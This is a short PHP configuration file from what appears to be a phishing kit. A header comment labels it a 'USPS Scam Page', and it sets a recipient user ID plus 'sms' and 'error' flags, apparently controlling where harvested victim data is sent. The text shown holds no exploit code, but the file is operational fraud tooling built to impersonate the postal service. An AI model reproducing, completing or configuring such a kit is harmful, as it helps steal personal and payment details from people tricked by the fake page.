<?php
/* 
USPS Scam Page 2021
CODED BY N0EMAN
*/
$user_ids=array("1119590255");
$sms='1';
$error='0';
?>
